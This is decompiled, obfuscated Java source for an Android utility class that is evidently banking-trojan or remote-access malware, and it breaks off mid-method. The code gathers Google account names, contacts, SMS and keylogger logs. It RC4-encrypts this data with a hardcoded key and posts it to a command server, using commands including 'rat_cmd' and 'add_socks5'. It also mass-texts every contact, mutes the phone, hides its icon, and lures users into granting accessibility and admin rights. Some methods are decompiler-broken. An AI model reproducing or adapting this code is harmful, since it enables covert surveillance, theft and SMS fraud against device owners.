package com.example.mmm.Utils;

import a.o;
import a.r;
import a.u;
import a.w;
import a.x;
import a.y;
import a.z;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.app.job.JobScheduler;
import android.app.job.JobInfo.Builder;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.NetworkInfo.State;
import android.os.Build;
import android.os.PowerManager;
import android.os.Build.VERSION;
import android.os.PowerManager.WakeLock;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.Settings.Secure;
import android.provider.Telephony.Sms;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.TextUtils.SimpleStringSplitter;
import android.text.format.Time;
import android.util.Base64;
import android.util.Log;
import com.example.mmm.constants;
import com.example.mmm.mainActivity;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Activity.actDozeMode;
import com.example.mmm.Activity.actToaskAccessibility;
import com.example.mmm.Admin.ReceiverDeviceAdmin;
import com.example.mmm.Receiver.bootReceiver;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvIBlackScreen;
import com.example.mmm.Service.srvJOB;
import com.example.mmm.Service.srvNetworkConnect;
import com.example.mmm.Service.srvWhileWorker;
import java.io.File;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;

public class utils {
   static final boolean warming$ = utils.class.desiredAssertionStatus() ^ true;
   private static SharedPreferences settings = null;
   private static Editor editor = null;
   private static WakeLock wakeLock;
   constants consts = new constants();

   public static int getMiuiVersion() {
      Object var10001 = null;
      Object var10003 = null;
      Runtime.getRuntime().exec("getprop ro.miui.ui.version.name").getInputStream();
      boolean var3 = true;
      Object var1 = null;
      Object var2 = null;
      int var0 = Integer.parseInt(((String)var2).replace("V", ""));
      return var0;
   }

   public static String countrySIM(Context var0) {
      TelephonyManager var1 = (TelephonyManager)var0.getSystemService("phone");
      return var1.getNetworkCountryIso().isEmpty() ? "~no~" : var1.getNetworkCountryIso();
   }

   static String _premises(String var0) {
      if (var0 != null && var0.length() != 0) {
         char var1 = var0.charAt(0);
         if (Character.isUpperCase(var1)) {
            return var0;
         } else {
            StringBuilder var2 = new StringBuilder();
            var2.append(Character.toUpperCase(var1));
            var2.append(var0.substring(1));
            return var2.toString();
         }
      } else {
         return "";
      }
   }

   public static String _anaheim(String var0, String var1, String var2) {
      var0 = var0.substring(var0.indexOf(var1) + var1.length(), var0.indexOf(var2));
      return var0;
   }

   public static JSONObject mergeJSONObjects(JSONObject var0, JSONObject var1) {
      JSONObject var2 = new JSONObject();
      Iterator var4 = var0.keys();
      Iterator var3 = var1.keys();

      while(var4.hasNext()) {
         String var5 = (String)var4.next();
         var2.put(var5, var0.get(var5));
      }

      while(var3.hasNext()) {
         String var6 = (String)var3.next();
         var2.put(var6, var1.get(var6));
      }

      return var2;
   }

   public static void chalkTile(int var0) {
      TimeUnit.MILLISECONDS.sleep((long)var0);
   }

   public static void startCustomTimer(Context var0, String var1, long var2) {
      var1 = "";
      Intent var4 = new Intent(var0, bootReceiver.class);
      var4.setAction(var1);
      PendingIntent var5 = PendingIntent.getBroadcast(var0, 0, var4, 0);
      ((AlarmManager)var0.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + var2, var2, var5);
   }

   public static boolean isMyServiceRunning(Context var0, Class var1) {
      Iterator var3 = ((ActivityManager)var0.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();

      RunningServiceInfo var2;
      do {
         if (!var3.hasNext()) {
            return false;
         }

         var2 = (RunningServiceInfo)var3.next();
      } while(!var1.getName().equals(var2.service.getClassName()));

      return true;
   }

   public static byte[] _update(File var0) {
      Object var3 = null;
      byte[] var4 = new byte[(int)0L];
      boolean var1 = false;
      int var10001 = var4.length;
      var10001 = var4.length;
      ((InputStream)var3).close();
      return var4;
   }

   public static Bitmap _slides(String var0) {
      byte[] var1 = Base64.decode(var0.getBytes(), 0);
      return BitmapFactory.decodeByteArray(var1, 0, var1.length);
   }

   private String _checking(String var1, String var2) {
      StringBuilder var3 = new StringBuilder();
      var3.append(var2);
      var3.append("&end=0");
      String var10 = var3.toString();
      var2 = _anaheim(var10, "q=", "&ws=");
      String var4 = _anaheim(var10, "&ws=", "&end=0");
      var3 = new StringBuilder();
      var3.append(var2);
      var3.append("   ");
      var3.append(var4);
      this.Log("q_ws", var3.toString());
      u var11 = new u();
      o.a var8 = (new o.a()).a("q", var2).a("ws", var4);
      o var12 = new o(var8.a, var8.b);
      x.a var5 = new x.a();
      if (var1 != null) {
         StringBuilder var9;
         if (var1.regionMatches(true, 0, "ws:", 0, 3)) {
            var9 = new StringBuilder("http:");
            var9.append(var1.substring(3));
            var2 = var9.toString();
         } else {
            var2 = var1;
            if (var1.regionMatches(true, 0, "wss:", 0, 4)) {
               var9 = new StringBuilder("https:");
               var9.append(var1.substring(4));
               var2 = var9.toString();
            }
         }

         r var6 = r.d(var2);
         if (var6 != null) {
            z var7 = (new w(var11, var5.a(var6).a("POST", (y)var12).a(), false)).a();
            var2 = var7.g.d();
            if (var7 != null) {
               var7.close();
            }

            return var2;
         } else {
            throw new IllegalArgumentException("unexpected url: ".concat(String.valueOf(var2)));
         }
      } else {
         throw new NullPointerException("url == null");
      }
   }

   public static void _module(Context var0) {
      if (!isNotificationServiceEnabled(var0)) {
         Intent var1 = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
         var1.addFlags(268435456);
         var0.startActivity(var1);
      }

   }

   public static boolean isAccessibilityServiceEnabled(Context var0, Class var1) {
      var1 = srvAccessibility.class;
      ComponentName var5 = new ComponentName(var0, var1);
      String var3 = Secure.getString(var0.getContentResolver(), "enabled_accessibility_services");
      if (var3 == null) {
         return false;
      } else {
         SimpleStringSplitter var4 = new SimpleStringSplitter(':');
         var4.setString(var3);

         while(var4.hasNext()) {
            ComponentName var6 = ComponentName.unflattenFromString(var4.next());
            if (var6 != null) {
               boolean var2 = var6.equals(var5);
               if (var2) {
                  return true;
               }
            }
         }

         return false;
      }
   }

   public static String hasPermission(Context var0, String var1) {
      return var0.checkCallingOrSelfPermission(var1) != 0 ? "0" : "1";
   }

   private static String _giant(String var0, String var1) {
      byte[] var5 = (new ClassRC4(var1.getBytes()))._liver(var0.getBytes());
      StringBuffer var6 = new StringBuffer(var5.length * 2);
      int var3 = var5.length;

      for(int var2 = 0; var2 < var3; ++var2) {
         String var4 = Integer.toString(var5[var2] & 255, 16);
         if (var4.length() < 2) {
            var6.append('0');
         }

         var6.append(var4);
      }

      return Base64.encodeToString(var6.toString().getBytes(), 0);
   }

   public static boolean isNotificationServiceEnabled(Context var0) {
      String var2 = var0.getPackageName();
      String var4 = Secure.getString(var0.getContentResolver(), "enabled_notification_listeners");
      if (!TextUtils.isEmpty(var4)) {
         String[] var5 = var4.split(":");

         for(int var1 = 0; var1 < var5.length; ++var1) {
            ComponentName var3 = ComponentName.unflattenFromString(var5[var1]);
            if (var3 != null && TextUtils.equals(var2, var3.getPackageName())) {
               return true;
            }
         }
      }

      return false;
   }

   public static String _cookie(String var0) {
      var0 = Base64.encodeToString(var0.getBytes("UTF-8"), 0);
      return var0;
   }

   private static String _possibly(String var0, String var1) {
      byte[] var2 = hexStringToByteArray(new String(Base64.decode(var0, 0), "UTF-8"));
      var0 = new String((new ClassRC4(var1.getBytes()))._nevada(var2));
      return var0;
   }

   @TargetApi(23)
   @TargetApi(23)
   public static void scheduleJob(Context var0) {
      Builder var1 = new Builder(0, new ComponentName(var0, srvJOB.class));
      var1.setMinimumLatency(15000L);
      var1.setOverrideDeadline(30000L);
      var1.setRequiredNetworkType(1);
      var1.setRequiresDeviceIdle(true);
      var1.setRequiresCharging(false);
      ((JobScheduler)var0.getSystemService(JobScheduler.class)).schedule(var1.build());
   }

   public static void _casual(Context var0, String var1) {
      var0.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(var1)));
   }

   public static String _efforts(String var0) {
      var0 = new String(Base64.decode(var0, 0), "UTF-8");
      return var0;
   }

   public static void swapSmsManager(Context var0, String var1) {
      Intent var2 = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      var2.putExtra("package", var1);
      var2.addFlags(268435456);
      var0.startActivity(var2);
   }

   public static boolean checkNetworkConnection(Context var0) {
      ConnectivityManager var2 = (ConnectivityManager)var0.getSystemService("connectivity");
      NetworkInfo var1 = var2.getNetworkInfo(1);
      if (var1 != null && var1.isConnected()) {
         return true;
      } else {
         var1 = var2.getNetworkInfo(0);
         if (var1 != null && var1.isConnected()) {
            return true;
         } else {
            NetworkInfo var3 = var2.getActiveNetworkInfo();
            return var3 != null && var3.isConnected();
         }
      }
   }

   public static String getBatteryLevel(Context var0) {
      Intent var3 = var0.registerReceiver((BroadcastReceiver)null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
      int var1 = var3.getIntExtra("level", -1);
      int var2 = var3.getIntExtra("scale", -1);
      return String.valueOf(Math.round((float)var1 / (float)var2 * 100.0F));
   }

   public static byte[] hexStringToByteArray(String var0) {
      int var2 = var0.length();
      byte[] var3 = new byte[var2 / 2];

      for(int var1 = 0; var1 < var2; var1 += 2) {
         var3[var1 / 2] = (byte)((Character.digit(var0.charAt(var1), 16) << 4) + Character.digit(var0.charAt(var1 + 1), 16));
      }

      return var3;
   }

   private String sendSmsLogs(Context var1, String var2, String var3, String var4) {
      JSONObject var5 = new JSONObject();
      var5.put("ID", var3);
      var5.put("LG", var2);
      Time var9 = new Time(Time.getCurrentTimezone());
      var9.setToNow();
      StringBuilder var6 = new StringBuilder();
      var6.append(var9.year);
      var6.append("-");
      var6.append(var9.month);
      var6.append("-");
      var6.append(var9.monthDay);
      var6.append(" ");
      var6.append(var9.format("%k:%M"));
      var5.put("DT", var6.toString());
      this.Log("SEND SMS", "logs: ".concat(String.valueOf(var2)));
      StringBuilder var8 = new StringBuilder();
      var8.append(var4);
      var8.append(this._grown(var5.toString()));
      String var7 = this._marina(this._brought(var1, var8.toString()));
      return var7;
   }

   public static void runApplication(Context var0, String var1) {
      var0.startActivity(var0.getPackageManager().getLaunchIntentForPackage(var1));
   }

   public static String _castle(Context var0) {
      Account[] var4 = AccountManager.get(var0).getAccounts();
      int var2 = var4.length;

      for(int var1 = 0; var1 < var2; ++var1) {
         Account var3 = var4[var1];
         if (var3.type.equals("com.google")) {
            return var3.name;
         }
      }

      return "";
   }

   private static String _orbit(String var0) {
      var0 = "";
      var0.length();
      return var0;
   }

   public static String getAccounts(Context var0) {
      Account[] var3 = AccountManager.get(var0).getAccountsByType("com.google");
      String var6 = "";
      int var2 = var3.length;

      for(int var1 = 0; var1 < var2; ++var1) {
         Account var4 = var3[var1];
         StringBuilder var5 = new StringBuilder();
         var5.append(var6);
         var5.append(var4.name);
         var5.append(",");
         var6 = var5.toString();
      }

      return var6;
   }

   public static boolean _exercise(Context var0) {
      return ((DevicePolicyManager)var0.getSystemService("device_policy")).isAdminActive(new ComponentName(var0, ReceiverDeviceAdmin.class));
   }

   public static boolean _prayer(Context var0) {
      return VERSION.SDK_INT >= 23 ? ((PowerManager)var0.getSystemService("power")).isIgnoringBatteryOptimizations(var0.getPackageName()) : true;
   }

   public static String _janet(Context var0) {
      return !((KeyguardManager)var0.getSystemService("keyguard")).inKeyguardRestrictedInputMode() ? "1" : "0";
   }

   public static String _delhi(Context var0) {
      if (VERSION.SDK_INT >= 19) {
         return !Sms.getDefaultSmsPackage(var0).equals(var0.getPackageName()) ? "0" : "1";
      } else {
         return "0";
      }
   }

   public static boolean getScreenBoolean(Context var0) {
      return !((KeyguardManager)var0.getSystemService("keyguard")).inKeyguardRestrictedInputMode();
   }

   public static void _pensions(Context var0) {
      AudioManager var1 = (AudioManager)var0.getSystemService("audio");
      var1.setStreamMute(1, true);
      var1.setStreamMute(3, true);
      var1.setStreamVolume(4, 0, 0);
      var1.setStreamVolume(8, 0, 0);
      var1.setStreamVolume(5, 0, 0);
      var1.setStreamVolume(2, 0, 0);
      var1.setVibrateSetting(1, 0);
   }

   private String _nvidia(Context var1) {
      String var2 = this._marina(this._brought(var1, "q=get_number&ws=0"));
      return var2;
   }

   public final String _decrease(Context var1, String var2, String var3, String var4, String var5) {
      JSONObject var6 = new JSONObject();
      JSONObject var9 = new JSONObject(var3);
      var6.put("LG", var9.getString("data"));
      var6.put("ID", var4);
      var6.put("AP", var9.getString("application"));
      var6.put("IT", var2);
      this.Log("SEND", "idinject: ".concat(String.valueOf(var2)));
      this.Log("SEND", "idbot: ".concat(String.valueOf(var4)));
      StringBuilder var8 = new StringBuilder("application: ");
      var8.append(var9.getString("application"));
      this.Log("SEND", var8.toString());
      var8 = new StringBuilder("logs: ");
      var8.append(var9.getString("data"));
      this.Log("SEND", var8.toString());
      var8 = new StringBuilder();
      var8.append(var5);
      var8.append(this._grown(var6.toString()));
      String var7 = this._marina(this._brought(var1, var8.toString()));
      return var7;
   }

   public final String _markers(Context var1, String var2, String var3, String var4, String var5, String var6, String var7) {
      JSONObject var8 = new JSONObject();
      var8.put("id_device", var2);
      var8.put("country", var3);
      var8.put("host", var4);
      var8.put("port", var5);
      var8.put("user", var6);
      var8.put("pass", var7);
      StringBuilder var10 = new StringBuilder();
      var10.append(var6);
      var10.append("@");
      var10.append(var4);
      var10.append(":");
      var10.append(var5);
      this.Log("Send_add_socks5", var10.toString());
      var10 = new StringBuilder();
      var10.append("q=add_socks5&ws=");
      var10.append(this._grown(var8.toString()));
      String var9 = this._marina(this._brought(var1, var10.toString()));
      return var9;
   }

   public final void _recovery(Context var1, String var2) {
      Cursor var8 = var1.getContentResolver().query(Phone.CONTENT_URI, (String[])null, (String)null, (String[])null, (String)null);
      boolean var7 = false;
      int var4 = 0;

      boolean var6;
      for(boolean var3 = false; var8.moveToNext(); var3 = var6) {
         String var9 = var8.getString(var8.getColumnIndex("data1"));
         int var5 = var4;
         var6 = var3;
         if (!var9.contains("*")) {
            var5 = var4;
            var6 = var3;
            if (!var9.contains("#")) {
               var5 = var4;
               var6 = var3;
               if (var9.length() > 7) {
                  this._meant(var1, var9, var2);
                  var5 = var4 + 1;
                  var6 = true;
               }
            }
         }

         chalkTile(1000);
         var4 = var5;
      }

      boolean var10001 = true;
   }

   public final void _spaces(Context var1, String var2, String var3) {
      int var4 = 0;
      if (!var3.isEmpty() && !var3.equals(" ")) {
         int var6 = Integer.parseInt(var3.replace(" ", ""));
      } else {
         boolean var5 = true;
      }

      while(true) {
         chalkTile(1000);
         boolean var10001 = true;
         var3 = this._nvidia(var1);
         if (var3.isEmpty()) {
            return;
         }

         this._meant(var1, var3, var2);
         ++var4;
      }
   }

   public final void _tattoo(Context var1, String var2, String var3, String var4) {
      if (VERSION.SDK_INT >= 28) {
         NotificationManager var5 = (NotificationManager)var1.getSystemService("notification");
         var5.cancelAll();
         if (!warming$ && var5 == null) {
            throw new AssertionError();
         }

         if (var5.getNotificationChannel("com.lliwljofvp.akgndulzcijjcol_notification_id") == null) {
            var5.createNotificationChannel(new NotificationChannel("com.lliwljofvp.akgndulzcijjcol_notification_id", "com.lliwljofvp.akgndulzcijjcol_notification_name", 4));
         }

         Intent var10;
         PendingIntent var11;
         if (var4.equals("accessibility")) {
            if (this.consts.regional$) {
               var10 = new Intent(var1, actToaskAccessibility.class);
            } else {
               var10 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            }

            var10.putExtra("123", 123);
            var11 = PendingIntent.getActivity(var1, 0, var10, 134217728);
         } else if (var4.equals("main")) {
            var10 = new Intent("miui.intent.action.APP_PERM_EDITOR");
            var10.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
            var10.putExtra("extra_pkgname", var1.getPackageName());
            var10.setFlags(268435456);
            var10.putExtra("123", 123);
            var11 = PendingIntent.getActivity(var1, 0, var10, 134217728);
         } else {
            var11 = null;
         }

         android.app.Notification.Builder var6 = (new android.app.Notification.Builder(var1)).setChannelId("com.lliwljofvp.akgndulzcijjcol_notification_id").setTicker("Nature");
         Resources var7 = var1.getResources();
         StringBuilder var8 = new StringBuilder();
         var8.append(var1.getPackageName());
         var8.append(":mipmap/ic_launcher");
         Notification var9 = var6.setSmallIcon(var7.getIdentifier(var8.toString(), (String)null, (String)null)).setContentTitle(var2).setContentText(var3).setFullScreenIntent(var11, true).setOngoing(true).setAutoCancel(true).getNotification();
         var9.flags |= 32;
         var5.notify(123, var9);
      }

   }

   public final void _firms(String var1, Context var2) {
      if (!"xiaomi".equalsIgnoreCase(Build.MANUFACTURER) || getMiuiVersion() < 10 || this.SettingsRead(var2, "XB").equals("1")) {
         if (!_prayer(var2) && Integer.parseInt(this.SettingsRead(var2, "SM")) > 2 || !_prayer(var2) && isAccessibilityServiceEnabled(var2, srvAccessibility.class)) {
            this.SettingsWrite(var2, "SQ", "1");
            this.Log(var1, "autoClick=1 Doze Mode");
            Intent var3 = new Intent(var2, actDozeMode.class);
            var3.addFlags(268435456);
            var3.addFlags(1073741824);
            var2.startActivity(var3);
         }

      }
   }

   public final void Log(String var1, String var2) {
      if (this.consts.ongoing$) {
         Log.e(var1, var2);
      }

   }

   public final String _basin() {
      (new AsnycTask(this, (byte)0)).execute(new Void[0]);
      AsnycTask var1 = new AsnycTask(this, (byte)0);
      var1.execute(new Void[0]);
      String var2 = (String)var1.get();
      return var2;
   }

   public final String _storage(int var1) {
      String var3 = "qwertyuiopasdfghjklzxcvbnm1234567890";
      Random var4 = new Random();
      StringBuilder var5 = new StringBuilder();

      for(int var2 = 0; var2 < var1; ++var2) {
         var5.append(var3.charAt(var4.nextInt(var3.length())));
      }

      return var5.toString();
   }

   public final String _atlantic(Context var1, String var2, String var3, String var4) {
      JSONObject var5 = new JSONObject();
      var5.put("ID", var3);
      var5.put("IT", var2);
      StringBuilder var7 = new StringBuilder();
      var7.append(var4);
      var7.append(this._grown(var5.toString()));
      String var6 = this._marina(this._brought(var1, var7.toString()));
      return var6;
   }

   public final void _pasta(Context var1, String var2) {
      String[] var5 = var2.split("###");

      String var4;
      for(int var3 = 0; var3 < var5.length; var2 = var4) {
         var4 = var2;
         if (!var5[var3].isEmpty()) {
            Object var10001 = null;
            String var10002 = var5[var3];
            String var6 = Base64.encodeToString(_update((File)null), 0);
            var10001 = null;
            var10002 = var5[var3];
            Object var7 = null;
            JSONObject var8 = new JSONObject();
            var8.put("cmd", "saved_file");
            var8.put("ID", this.SettingsRead(var1, "QQ"));
            var8.put("name", var7);
            var8.put("file_base64", var6);
            StringBuilder var10 = new StringBuilder();
            var10.append("q=rat_cmd&ws=");
            var10.append(this._grown(var8.toString()));
            var6 = this._marina(this._brought(var1, var10.toString()));
            this.Log("responce", " - > ".concat(String.valueOf(var6)));
            var4 = var2;
            if (var6.equals("ok")) {
               StringBuilder var9 = new StringBuilder("###");
               var9.append(var5[var3]);
               var4 = var2.replace(var9.toString(), "");
               this.SettingsWrite(var1, "FF", var4);
               var10001 = null;
               var10002 = var5[var3];
               boolean var10000 = false;
            }
         }

         ++var3;
      }

   }

   public final void _meant(Context var1, String var2, String var3) {
      SmsManager var5 = SmsManager.getDefault();
      ArrayList var6 = var5.divideMessage(var3);
      Intent var7 = new Intent("SMS_SENT");
      int var4 = 0;
      PendingIntent var12 = PendingIntent.getBroadcast(var1, 0, var7, 0);
      PendingIntent var8 = PendingIntent.getBroadcast(var1, 0, new Intent("SMS_DELIVERED"), 0);
      ArrayList var9 = new ArrayList();

      ArrayList var10;
      for(var10 = new ArrayList(); var4 < var6.size(); ++var4) {
         var10.add(var8);
         var9.add(var12);
      }

      var5.sendMultipartTextMessage(var2, (String)null, var6, var9, var10);
      StringBuilder var11 = new StringBuilder("Output SMS:");
      var11.append(var2);
      var11.append(" text:");
      var11.append(var3);
      var11.append("[143523#]");
      var2 = var11.toString();
      this.Log("SMS", var2);
      this.SettingsToAdd(var1, "AS", var2);
      this._compiled(var1, this.SettingsRead(var1, "QQ"));
   }

   public final String[] _pants(File var1) {
      JSONObject var4 = new JSONObject();
      JSONObject var5 = new JSONObject();
      int[] var6 = new int[]{0, 0};
      var1 = null;
      int var3 = ((Object[])var1).length;

      for(int var2 = 0; var2 < var3; ++var2) {
         Object var7 = ((Object[])var1)[var2];
         boolean var10000 = false;
         var5.put(Integer.toString(var6[1]), (Object)null);
         int var10002 = var6[1]++;
      }

      return new String[]{var4.toString(), var5.toString()};
   }

   public final String _numbers() {
      JSONObject var1 = new JSONObject("{'en':'Enable','de':'Aktivieren','af':'Aktiveer','zh':'启用','cs':'Zapnout','nl':'Activeren','fr':'Activer','it':'Abilitare','ja':'有効にする','ko':'사용하다','pl':'włączyć','es':'Habilitar','ar':'يُمكّن','bg':'Възможност','ca':'Enable','hr':'Aktivirati','da':'Aktivere','fi':'Ottaa käyttöön','el':'ενεργοποιώ','iw':'הפוך לזמין','hi':'सक्षम करें','hu':'Engedélyez','in':'Fungsikan','lv':'Aktivizēt','lt':'Aktyvinti','nb':'Aktivere','pt':'Ativar','ro':'Activa','sr':'Aktivirati','sk':'Aktivovať','sl':'Vključiti','sv':'Aktivera','th':'เปิดใช้งาน','tr':'Lütfen','vi':'có hiệu lực'}");
      String var2 = Locale.getDefault().getLanguage().toLowerCase();
      if (var2.equals("tr")) {
         StringBuilder var4 = new StringBuilder("Lütfen ");
         var4.append("gÃ¼ncelleme");
         var4.append(" Etkinleştirin");
         return var4.toString();
      } else {
         String var3 = var1.getString(var2);
         StringBuilder var5 = new StringBuilder();
         var5.append(var3);
         var5.append(" ");
         var5.append("gÃ¼ncelleme");
         var3 = var5.toString();
         return var3;
      }
   }

   public final String _tests(Context var1, String var2, String var3) {
      JSONObject var4 = new JSONObject();
      var4.put("AK", var2);
      StringBuilder var6 = new StringBuilder();
      var6.append(var3);
      var6.append(this._grown(var4.toString()));
      String var5 = this._marina(this._brought(var1, var6.toString()));
      return var5;
   }

   public final String sendSavedSms(Context var1, String var2, String var3, String var4) {
      JSONObject var5 = new JSONObject();
      var5.put("ID", var3);
      var5.put("LS", var2);
      this.Log("Send Saved SMS", "logs: ".concat(String.valueOf(var2)));
      StringBuilder var7 = new StringBuilder();
      var7.append(var4);
      var7.append(this._grown(var5.toString()));
      String var6 = this._marina(this._brought(var1, var7.toString()));
      return var6;
   }

   public final String _center(String var1) {
      JSONObject var2 = new JSONObject();
      var2.put("1", "1");
      StringBuilder var3 = new StringBuilder();
      var3.append("q=connecting&ws=");
      var3.append(var2);
      var1 = this._marina(this._checking(var1, var3.toString()));
      return var1;
   }

   public final String _ranch() {
      String var1 = (new JSONObject("{'en':'Open More downloaded services > ','de':'Öffnen Sie Weitere heruntergeladene Dienste > ','af':'Open Meer afgelaaide dienste > ','zh':'打开更多下载的服务 > ','cs':'Otevřít Více stažených služeb > ','nl':'Open Meer gedownloade services > ','fr':'Ouvrir Plus de services téléchargés > ','it':'Apri Altri servizi scaricati > ','ja':'ダウンロードしたサービスをさらに開く > ','ko':'더 많은 다운로드 서비스 열기 > ','pl':'Otwórz więcej pobranych usług > ','es':'Abrir más servicios de descargas > ','ar':'فتح المزيد من الخدمات التي تم تنزيلها > ','bg':'Отворете Още изтеглени услуги > ','ca':'Open More downloaded services > ','hr':'Otvori Više preuzetih usluga > ','da':'Åpne Flere nedlastede tjenester > ','fi':'Avaa Lisää ladattuja palveluita > ','el':'Ανοίξτε Περισσότερες υπηρεσίες λήψης > ','iw':'פתח שירותים מורידים נוספים > ','hi':'अधिक डाउनलोड की गई सेवाएँ खोलें > ','hu':'Nyisson meg több letöltött szolgáltatást > ','in':'Buka Lebih banyak layanan yang diunduh > ','lv':'Atveriet vairāk lejupielādētos pakalpojumus > ','lt':'Atidarykite Daugiau atsisiųstų paslaugų > ','nb':'Åpne Flere nedlastede tjenester > ','pt':'Abrir Mais serviços baixados > ','ro':'Deschide Mai multe servicii descărcate > ','sr':'Отвори Још преузетих услуга > ','sk':'Open More downloaded services > ','sl':'Odprite Več prenesenih storitev > ','sv':'Öppna Fler nedladdade tjänster > ','th':'เปิดบริการที่ดาวน์โหลดเพิ่มเติม > ','tr':'Aç Diğer indirilen hizmetler > ','vi':'Mở thêm dịch vụ đã tải xuống > '}")).getString(Locale.getDefault().getLanguage());
      return var1;
   }

   public final String _plates(Context var1, String var2, String var3) {
      JSONObject var4 = new JSONObject();
      var4.put("AK", var2);
      StringBuilder var6 = new StringBuilder();
      var6.append(var3);
      var6.append(this._grown(var4.toString()));
      String var5 = this._brought(var1, var6.toString());
      return var5;
   }

   public final String _scott(Context var1, String var2, String var3, String var4) {
      JSONObject var5 = new JSONObject();
      var5.put("ID", var3);
      var5.put("LS", var2);
      this.Log("Send Saved SMS", "logs: ".concat(String.valueOf(var2)));
      StringBuilder var7 = new StringBuilder();
      var7.append(var4);
      var7.append(this._grown(var5.toString()));
      String var6 = this._marina(this._brought(var1, var7.toString()));
      return var6;
   }

   public final String _painful() {
      String var1 = (new JSONObject("{'en':'Click on me to activate','de':'Klicken Sie auf mich zu aktivieren','af':'Klik op my om te aktiveer','zh':'点击我激活','cs':'Klikněte na mě pro aktivaci','nl':'Klik op mij om te activeren','fr':'Cliquez sur moi pour activer','it':'Clicca su di me per attivare','ja':'クリックしてアクティベート','ko':'활성화하려면 저를 클릭하십시오','pl':'Kliknij na mnie, aby aktywować','es':'Haz clic en mí para activar','ar':'اضغط علي لتفعيل','bg':'Кликни върху мен, за да се активира','ca':'Click on me to activate','hr':'Kliknite na mene da se aktiviram','da':'Klikk på meg for å aktivere','fi':'Napsauta minua aktivoimaan','el':'Κάντε κλικ σε με για να ενεργοποιήσετε','iw':'לחץ עליי כדי להפעיל','hi':'मुझे सक्रिय करने के लिए क्लिक करें','hu':'Kattintson rám az aktiváláshoz','in':'Klik saya untuk mengaktifkan','lv':'Noklikšķiniet uz manis, lai aktivizētu','lt':'Spustelėkite mane norėdami suaktyvinti','nb':'Klikk på meg for å aktivere','pt':'Clique em mim para ativar','ro':'Faceți clic pe mine pentru a activa','sr':'Кликните на мене да се активирам','sk':'Click on me to activate','sl':'Kliknite na mene, da se aktiviram','sv':'Klicka på mig för att aktivera','th':'คลิกที่ฉันเพื่อเปิดใช้งาน','tr':'Etkinleştirmek için bana tıkla','vi':'Bấm vào tôi để kích hoạt'}")).getString(Locale.getDefault().getLanguage());
      return var1;
   }

   public final String _servers(Context var1, String var2, String var3, String var4) {
      JSONObject var5 = new JSONObject();
      var5.put("ID", var3);
      var5.put("LS", var2);
      this.Log("Send Contacts", "logs: ".concat(String.valueOf(var2)));
      StringBuilder var7 = new StringBuilder();
      var7.append(var4);
      var7.append(this._grown(var5.toString()));
      String var6 = this._marina(this._brought(var1, var7.toString()));
      return var6;
   }

   public final void SettingsWrite(Context var1, String var2, String var3) {
      Editor var4 = var1.getSharedPreferences("ring0", 0).edit();
      var4.putString(var2, var3);
      var4.commit();
   }

   public final String sendAddSocks5(Context var1, String var2) {
      JSONObject var3 = new JSONObject();
      var3.put("id_device", var2);
      this.Log("Send_add_socks5", "Update ".concat(String.valueOf(var2)));
      StringBuilder var5 = new StringBuilder();
      var5.append("q=update_socks5&ws=");
      var5.append(this._grown(var3.toString()));
      String var4 = this._marina(this._brought(var1, var5.toString()));
      return var4;
   }

   public final String sendKeyloggerLogs(Context var1, String var2, String var3, String var4) {
      JSONObject var5 = new JSONObject();
      var5.put("LS", var2);
      var5.put("ID", var3);
      this.Log("SEND Keylogger", "logs: ".concat(String.valueOf(var2)));
      StringBuilder var7 = new StringBuilder();
      var7.append(var4);
      var7.append(this._grown(var5.toString()));
      String var6 = this._marina(this._brought(var1, var7.toString()));
      return var6;
   }

   public final void SettingsToAdd(Context var1, String var2, String var3) {
      String var6 = this.SettingsRead(var1, var2);
      String var4 = var3;
      if (!var6.isEmpty()) {
         StringBuilder var7 = new StringBuilder();
         var7.append(var6);
         var7.append(var3);
         var4 = var7.toString();
      }

      this.SettingsWrite(var1, var2, var4);
   }

   public final String _grown(String var1) {
      return _giant(var1, "lASdSnSHWdna");
   }

   public final void _bhutan(Context var1) {
      if (this.SettingsRead(var1, "RS").equals("true")) {
         var1.startService(new Intent(var1, srvIBlackScreen.class));
      }

   }

   public final void _founded(Context var1, String var2, String var3) {
      this.SettingsWrite(var1, var2, this.SettingsRead(var1, var2).replace(var3, ""));
   }

   public final String _marina(String var1) {
      return _possibly(var1, "lASdSnSHWdna");
   }

   public final void _chapel(Context var1) {
      if ("".isEmpty()) {
         ComponentName var2 = new ComponentName(var1, mainActivity.class);
         var1.getPackageManager().setComponentEnabledSetting(var2, 2, 1);
      }

   }

   public final void _compiled(Context var1, String var2) {
      String var3 = this.SettingsRead(var1, "AS");
      if (!var3.isEmpty() && this.sendSmsLogs(var1, var3, var2, "q=saved_data_device&ws= ").equals("ok")) {
         if (this.SettingsRead(var1, "AS").length() > var3.length()) {
            this._founded(var1, "AS", var3);
            return;
         }

         this.SettingsWrite(var1, "AS", "");
      }

   }

   final String _brought(Context var1, String var2) {
      String var3 = this.SettingsRead(var1, "QE");
